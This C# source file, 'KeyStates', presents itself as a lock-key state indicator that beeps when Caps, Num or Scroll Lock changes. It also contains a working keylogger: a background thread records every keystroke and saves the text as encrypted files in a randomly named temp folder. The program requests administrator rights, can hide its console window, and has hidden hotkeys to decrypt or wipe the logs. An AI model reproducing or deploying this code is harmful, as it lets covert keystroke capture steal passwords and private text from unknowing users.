/*
 6-19-2024
 KeyStates W.I.P
 domer/PeripheralVisionPD2
*/

using KeyStates;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;

new KeyStatesCl().OnStart(); // start program

namespace KeyStates
{
    public struct LogCache
    {
        public string data;
    }

    public struct KeyCache
    {
        public bool Caps;
        public bool Num;
        public bool Scroll;
    }

    internal class KeyStatesCl
    {
        private Encryption.StringEncryptionService CryTxt = new Encryption.StringEncryptionService();

        //private FileEncryption Encrypt = new FileEncryption(); // archaic code

        // static data //
        private static readonly int SW_HIDE = 0;

        private static readonly string EncPass = "fart";
        private static readonly int SW_SHOW = 5;
        private static readonly ushort[] KeyArr = [0x14, 0x90, 0x91]; // caps, num, scroll
        private static readonly int ShfKey = 0x10;
        private static readonly int ConHide = 0x75;   // f6
        private static readonly int DecKey = 0x76;   // f7
        private static readonly int KillKey = 0x77;   // f8
        // end section//

        // editable data //
        private bool ConStat = true;

        private bool DecTog = false;
        private bool EmrKill = false;
        private bool ConIntr = false;
        private String TmpPath = "";
        private KeyCache StateHolder;                   // holds the state of lock keys (caps lock, num lock, scroll lock)
        private LogCache LogHolder;                     // keylogger input buffer

        private enum DbgMsgTypes : int
        {
            Default = 0,
            Error = 1
        }

        // end section //

        // dll imports section //

        /* [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool AttachConsole(uint dwProcessId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool FreeConsole();/* /*left over dbg crap*/

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        private static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll")]
        private static extern bool MessageBeep(uint uType);

        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(int vKey);

        // end section //

        // program main functions //
        private static string SecureRandomString(int length)
        {
            using (var rng = new RNGCryptoServiceProvider())
            {
                var bytes = new byte[length];
                rng.GetBytes(bytes);
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                return new string(bytes.Select(b => chars[b % chars.Length]).ToArray());
            }
        }

        private void DestroyLog()
        {
            //TglCon();
            Console.Write("[!] do you want to delete log files?");
            Thread.Sleep(200);
            Console.Write(" [Y/N]: ");
            String KeyPress = Console.ReadLine().ToString().ToLower();
            if (KeyPress == "y")
            {
                if (Directory.Exists(TmpPath))
                {
                    //CryptNHide(); old code
                    //IEnumerable<string> ExistFiles = Directory.EnumerateFiles(TmpPath); // dbg junk
                    // foreach (string ExistFile in ExistFiles)                          //
                    //     DbgMsg(ExistFile);                                           //
                    Directory.Delete(TmpPath, true);
                    DbgMsg("folder deleted");
                }
            }
            EmrKill = true;
            return;
        }

        private void StartDec()
        {
            String TypKey = "";
            String TypIV = "";
            DecTog = true;

            Console.Clear();
            DbgMsg("entered decrypt mode");
            Console.Write("[+] please enter key: ");
            TypKey = Console.ReadLine();
            Console.Write("[+] please enter iv: ");
            TypIV = Console.ReadLine();
            Console.Clear();
            CryTxt.SetKey(TypKey);
            CryTxt.SetIV(TypIV);

            DbgMsg($"key: ${TypKey}");
            DbgMsg($"iv: ${TypIV}");
            Console.Write("[!] decrypt all files? ");
            Thread.Sleep(200);
            Console.Write(" [Y/N]: ");
            String KeyPress = Console.ReadLine().ToString().ToLower();
            if (KeyPress == "y")
            {
                foreach (string x in Directory.EnumerateFiles(Environment.CurrentDirectory))
                {
                    if (Path.GetExtension(x) == ".ksd")
                    {
                        DbgMsg(x);
                        String TmpFln = SecureRandomString(6);
                        String EncFil = File.ReadAllText(x);
                        String DecFil = CryTxt.Decrypt(EncFil);
                        DbgMsg($"{TmpPath}\\{TmpFln}.txt");
                        File.WriteAllText($"{TmpPath}\\{TmpFln}.txt", DecFil);
                        //DbgMsg($"dumped keylog cache to {TmpFln}.dat", DbgMsgTypes.Default, true);
                    }
                }
            }
            DecTog = false;
        }

        private void LoopKeys()
        {
            DbgMsg("keylog thread started");
            int x = 0;
            while (true)
            {
                if (EmrKill)
                    return;
                for (int i = 0; i < 256; i++)
                {
                    bool LwUp = false;
                    if (GetAsyncKeyState(ShfKey) == 0) // check to see if the user is holding shift
                    {
                        LwUp = true;
                    }
                    if (GetAsyncKeyState(i) != 0)
                    {
                        char key = (char)i;
                        if (key == ConHide)     // f6 key to toggle dbg console
                            TglCon();
                        if (i == DecKey)    // f8 to kill program and delete all files
                            StartDec();
                        if (i == KillKey)    // f8 to kill program and delete all files
                            DestroyLog();
                        if (i == ShfKey || i == 0xA0 || i == 0xA1 || i == 0x14 || i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06) // keys that are pointless to log (caps lock, shift keys, etc...)
                            break;
                        if (LwUp == false || StateHolder.Caps == true)  // if the user is holding shift or caps lock is on, print the output character in uppercase, else print in lowercase
                        {
                            // Console.Write(key.ToString().ToUpper()); // dbg junk code
                            LogHolder.data += key.ToString().ToUpper();
                        }
                        else
                        {
                            // Console.Write(key.ToString().ToLower()); // dbg junk code
                            LogHolder.data += key.ToString().ToLower();
                        }
                        break;
                    }
                    x++;
                }
                if (x >= 90000 && LogHolder.data.Length > 25)
                {
                    // Console.Clear(); // dbg junk code
                    String TmpFln = SecureRandomString(6);

                    File.WriteAllText($"{TmpPath}\\" + TmpFln + ".ksd", CryTxt.Encrypt(LogHolder.data.Replace("\u0001", " ")));
                    LogHolder.data = "";
                    DbgMsg($"dumped keylog cache to {TmpFln}.ksd", DbgMsgTypes.Default, true);
                    x = 0;
                }
                Thread.Sleep(75);   // delay to prevent repeating characters //
            }
        }

        private void DbgMsg(String input, DbgMsgTypes type = DbgMsgTypes.Default, bool timestamp = false)
        {
            if (ConStat == false || !IsDebug())
                return;
            string formattedTimestamp = DateTimeOffset.Now.ToString("yyyyMMddHHmmss");
            switch (type)
            {
                case DbgMsgTypes.Default:

                    if (timestamp)
                    {
                        Console.ForegroundColor = ConsoleColor.Blue;
                        Console.Write($"||{formattedTimestamp}|| ");
                    }

                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.Write("[DBG]: ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write(input);
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.WriteLine(" :[END]");
                    Console.ForegroundColor = ConsoleColor.White;
                    break;

                case DbgMsgTypes.Error:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write($"||{formattedTimestamp}|| [ERR]: ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write(input);
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine(" :[END]");
                    Console.ForegroundColor = ConsoleColor.White;
                    break;
            }
        }

        private static bool IsDebug()
        {
#if DEBUG
            return true;
#endif
            return false;
        }

        private void TglCon()
        {
            // int ProcId = Process.GetCurrentProcess().Id; // dbg junk code
            if (ConStat)
            {
                DbgMsg("console hidden");
                ShowWindow(GetConsoleWindow(), SW_HIDE);
                ConStat = false;
                return;
            }
            ShowWindow(GetConsoleWindow(), SW_SHOW);
            ConStat = true;
            DbgMsg("console restored");
            return;
        }

        private static bool CheckTglState(int index)
        {
            return (((ushort)GetKeyState(KeyArr[index])) & 0xffff) != 0;
        }

        private void InitCache()
        {
            DbgMsg("initial cache set");
            StateHolder.Caps = CheckTglState(0);
            StateHolder.Num = CheckTglState(1);
            StateHolder.Scroll = CheckTglState(2);
        }

        private static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private void CheckDir()
        {
            if (TmpPath == "")
            {
                TmpPath = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), SecureRandomString(10));
                DbgMsg("tmp path set to " + TmpPath);
            }
            if (!Directory.Exists(TmpPath))
            {
                Directory.CreateDirectory(TmpPath);
            }
        }

        private void UpdateCache()
        {
            int i = 0;
            foreach (var key in KeyArr)
            {
                switch (i)
                {
                    case 0:
                        if (CheckTglState(i) == StateHolder.Caps)
                        {
                            break;
                        }
                        MessageBeep(0x00000040);
                        StateHolder.Caps = CheckTglState(i);
                        DbgMsg("CAPSLK " + StateHolder.Caps);
                        break;

                    case 1:
                        if (CheckTglState(i) == StateHolder.Num)
                        {
                            break;
                        }
                        MessageBeep(0x00000040);
                        StateHolder.Num = CheckTglState(i);
                        DbgMsg("NUMLK " + StateHolder.Num);
                        break;

                    case 2:
                        if (CheckTglState(i) == StateHolder.Scroll)
                        {
                            break;
                        }
                        MessageBeep(0x00000040);
                        StateHolder.Scroll = CheckTglState(i);
                        DbgMsg("SCRLK " + StateHolder.Scroll);
                        break;
                }
                i++;
            }
        }

        private static void ElevateProg()
        {
            ProcessStartInfo startInfo = new("KeyStates.exe");
            startInfo.UseShellExecute = true;
            startInfo.Verb = "runas";
            Process.Start(startInfo);
        }

        private void LogKeys()
        {
            DbgMsg("keytgl thread started");
            StateHolder.Caps = false;
            StateHolder.Scroll = false;
            StateHolder.Num = false;
            while (true)
            {
                if (ConIntr)
                    break;
                if (EmrKill)
                    return;
                UpdateCache();
                Thread.Sleep(100);
            }
        }

        private static bool ShowConfirmation(string message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write($"{message} (Y/N): ");
            char response = Console.ReadKey().KeyChar;
            return response == 'Y' || response == 'y';
        }

        public void OnStart()
        {
            if (!IsAdministrator())
            {
                bool continueProgram = ShowConfirmation("[!] program needs administrator permissions, relaunch as admin?");
                if (continueProgram)
                {
                    ElevateProg();
                }
                else
                {
                    return;
                }
                return;
            }
            else
                DbgMsg("succesfully launched with admin");

            //TglCon(true);
            DbgMsg("OnStart called");
            CheckDir();
            InitCache();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("/* 6 - 21 - 2024");
            Console.WriteLine("   KeyStates W.I.P");
            Console.WriteLine("   domer/PeripheralVisionPD2 */");
            Console.ForegroundColor = ConsoleColor.White;
            DbgMsg($"encryption key: {CryTxt.ShowKey()}");
            DbgMsg($"encryption iv: {CryTxt.ShowIV()}");
            Thread KeyLogLoop = new(LoopKeys);
            Thread TglKeyLoop = new(LogKeys);
            KeyLogLoop.Start();
            TglKeyLoop.Start();
        }

        // end section //
    }
}
